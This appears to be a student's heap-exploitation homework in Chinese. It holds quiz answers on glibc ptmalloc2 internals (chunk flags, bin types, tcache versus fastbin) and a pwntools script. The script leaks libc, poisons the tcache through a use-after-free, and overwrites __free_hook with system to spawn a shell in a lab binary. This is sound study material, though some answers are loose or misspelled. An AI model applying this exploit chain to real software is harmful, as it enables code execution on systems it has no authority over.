1. chunk作为内存分配的最小单元，其数据结构中包含三个标志位，这三个标志分别是什么？（5
   分）分别有什么作用？（5分）

   __N:是否属于主线程   M:是否由mmap分配   P:前一个chunk是否在使用状态__

2. 假设现在用户程序中调用 malloc(0x37) 来申请动态内存，最终得到的chunk大小是多少？（5分）实际上该chunk可用的数据区域有多大？（5分）

   __0x40   0x38__

3. ptmalloc2同过各种bins来管理释放的堆块（freed chunk），这些bins分别是什么？（5分）管理的chunk的大小范围是多少？（5分）其中哪些是通过双向链表组织，哪些通过单向链表组织（5分）

- **fast bin     [0x20, 0x80]    单向链表**
- **unsorted bin   无限制      双向链表**
- **small bin   [0x20, 0x400)   双向链表**
-  **large bin    [0x400, +∞）  双向链表**
- **tcache bin    [0x20, 0x80]    单向链表**
4. 简述tcache bin和fastbin两者的区别，列出两点即可。（名字不同不算 : ) ）（5分）

- **tcache bin有count，且每个大小的bin中存放的chunk的个数有限**
- **tanche bin优先级高于fast bin**

4. 在 malloc 的流程中，假设堆管理器在tcache bin和fastbin中均没有成功找到合适的chunk，请问下一步应该从哪个bin中搜索？（5分）假如所有的bins中都找不合适的chunk，请问这个时候从哪里获取合适的chunk？（5分）（假定 malloc 申请的内存空间大小足够小，单线程，不考虑mmap的情况）

​      __unsorted bin       top chunk__

5. 在 free 的流程中，假定chunk的大小为0x60，且此时tcache bin和fastbin都是空的，请问这个chunk会插入到哪个bin中？（5分）假定chunk的大小为0x500，怎么判断该chunk能不能进行前向合并的操作？（5分）（单线程，不考虑mmap的情况

​       __tcache bin    通过chunk的prev_inuse标志位检查是否能向前合并__

![image-20220714223606529](C:\Users\CurryRaid\AppData\Roaming\Typora\typora-user-images\image-20220714223606529.png)

```py
from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
p = process("./hw3_1")
elf=ELF('./hw3_1')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
sys_add1=libc.symbols['system']
def add(index, size):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Size: ", str(size))
def show(index):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Index: ", str(index))
def edit(index, content):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Index: ", str(index))
    p.sendafter("Content: ", content)
def delete(index):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Index: ", str(index))


# First, leak the libc address
add(0, 0x500)
add(1, 0x20)
delete(0)
show(0) # Here, we will get the the value of the chunk's fd
main_arena_offset = u64(p.recv(6) + b"\x00" * 2)
#gdb.attach(p)
libc_base = main_arena_offset - 0x7f1534976be0 + 0x7f153478b000 
#print(hex(libc.symbols['__free_hook']))
__free_hook = libc_base +libc.symbols['__free_hook']
print(hex(__free_hook))
system = libc_base + libc.symbols['system']
# Second, use UAF to hijack tcache bin linked list
add(0, 0x18) # parr[0] = malloc(0x18)
add(1, 0x18) # parr[1] = malloc(0x18)
delete(0)
delete(1)
edit(1, p64(__free_hook))
# Third, hijack __free_hook into system and trigger __free_hook
add(0, 0x18)
add(1, 0x18)
edit(0, "/bin/sh\x00")
edit(1,p64(system))
# Finally, trigger __free_hook
delete(0)
#print("main_arena_offset: %s" % hex(main_arena_offset))
p.interactive()
```

